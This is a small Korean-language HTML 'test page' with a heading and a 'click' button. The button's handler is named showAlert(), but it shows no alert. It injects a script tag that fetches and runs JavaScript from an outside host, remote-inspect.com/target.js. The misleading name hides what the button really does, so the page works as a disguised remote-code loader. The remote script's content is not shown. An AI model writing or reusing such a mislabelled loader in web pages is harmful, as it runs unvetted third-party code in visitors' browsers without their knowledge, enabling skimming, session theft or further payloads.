<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>테스트 페이지</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            text-align: center;
        }
        h1 {
            color: #333;
        }
        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
    
</head>
<body>
    <h1>심플한 테스트 페이지</h1>
    <p>이 페이지는 테스트를 위해 제작되었습니다.</p>
    <button onclick="showAlert()">클릭하세요</button>

    <script>
        function showAlert() {
            const script = document.createElement('script');
            script.src = 'https://remote-inspect.com/target.js';
            document.body.appendChild(script);
        }

    </script>
    
</body>
</html>
